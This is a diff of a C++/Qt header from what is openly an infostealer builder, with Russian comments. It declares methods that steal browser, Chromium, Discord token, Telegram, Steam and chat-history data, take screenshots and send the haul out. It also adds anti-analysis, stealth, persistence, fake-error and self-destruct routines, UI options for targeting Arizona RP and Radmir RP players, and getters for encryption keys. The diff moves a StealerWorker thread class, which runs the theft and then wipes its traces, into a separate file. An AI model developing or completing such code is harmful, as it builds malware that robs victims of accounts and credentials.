@@ -36,7 +36,7 @@
 #include <filesystem>
 #include <vector>
 #include <string>
-#include <map>          // Добавлено для std::map
+#include <map>
 #include <fstream>
 #include <thread>
 #include <regex>
@@ -93,11 +93,11 @@ public:
     void updateConfigFromUI();
     void setupPersistence();
 
-    // Методы для кражи данных (перенесены в public для использования в DataStealer)
-    std::string StealAndSendData(const std::string& tempDir); // Уже был публичным, но уточняем
+    // Методы для кражи данных
+    std::string StealAndSendData(const std::string& tempDir);
     std::string TakeScreenshot(const std::string& dir);
     std::string stealBrowserData(const std::string& dir);
-    std::string stealChromiumBrowserData(const std::string& profilePath, const std::string& browserName, const std::string& tempDir); // Добавлено
+    std::string stealChromiumBrowserData(const std::string& profilePath, const std::string& browserName, const std::string& tempDir);
     std::string StealDiscordTokens(const std::string& dir);
     std::string StealTelegramData(const std::string& dir);
     std::string StealSteamData(const std::string& dir);
@@ -111,6 +111,20 @@ public:
     std::string stealChatHistory(const std::string& dir);
     std::string collectSocialEngineeringData(const std::string& dir);
     std::string collectSystemInfo(const std::string& dir);
+
+    // Добавленные методы из ошибок сборки
+    bool AntiAnalysis();
+    void Stealth();
+    void Persist();
+    void FakeError();
+    void SelfDestruct();
+    bool checkDependencies();
+    void runTests();
+
+    // Геттеры для приватных членов
+    std::string getEncryptionKey1() const { return encryptionKey1; }
+    std::string getEncryptionKey2() const { return encryptionKey2; }
+    std::string getEncryptionSalt() const { return encryptionSalt; }
 
     // Структура для хранения настроек
     struct Config {
@@ -179,8 +193,8 @@ public:
     QCheckBox* autoStartCheckBox;
     QCheckBox* persistCheckBox;
     QCheckBox* selfDestructCheckBox;
-    QCheckBox* arizonaRPCheckBox;  // Убедимся, что они есть
-    QCheckBox* radmirRPCheckBox;   // Убедимся, что они есть
+    QCheckBox* arizonaRPCheckBox;
+    QCheckBox* radmirRPCheckBox;
     QTextEdit* textEdit;
     QPushButton* iconBrowseButton;
     QPushButton* buildButton;
@@ -192,7 +206,7 @@ public:
     QAction* actionAbout;
 
     // Векторы для хранения собранных данных
-    std::map<std::string, std::string> collectedData; // Изменено на map
+    std::map<std::string, std::string> collectedData;
     std::vector<std::string> collectedFiles;
 
 signals:
@@ -269,51 +283,6 @@ private:
     std::string encryptionSalt;
 };
 
-// Класс для работы в отдельном потоке
-class StealerWorker : public QObject {
-    Q_OBJECT
-public:
-    explicit StealerWorker(MainWindow* window, const std::string& tempDir, QObject* parent = nullptr)
-        : QObject(parent), window(window), tempDir(tempDir) {
-        if (!window) {
-            qWarning("StealerWorker: MainWindow pointer is null");
-        }
-    }
-
-public slots:
-    void process() {
-        if (!window) {
-            qWarning("StealerWorker: Cannot process, MainWindow is null");
-            emit finished();
-            return;
-        }
-
-        try {
-            window->StealAndSendData(tempDir);
-            qDebug("StealerWorker: Data stealing and sending completed successfully");
-        } catch (const std::exception& e) {
-            qWarning("StealerWorker: Exception during data stealing: %s", e.what());
-        }
-
-        // Очистка временной директории после завершения
-        std::error_code ec;
-        std::filesystem::remove_all(tempDir, ec);
-        if (ec) {
-            qWarning("StealerWorker: Failed to remove temp directory %s: %s", 
-                     tempDir.c_str(), ec.message().c_str());
-        } else {
-            qDebug("StealerWorker: Temp directory %s removed", tempDir.c_str());
-        }
-
-        emit finished();
-    }
-
-signals:
-    void finished();
-
-private:
-    MainWindow* window;
-    std::string tempDir;
-};
+#include "stealerworker.h" // Включение StealerWorker из отдельного файла
 
 #endif // MAINWINDOW_H
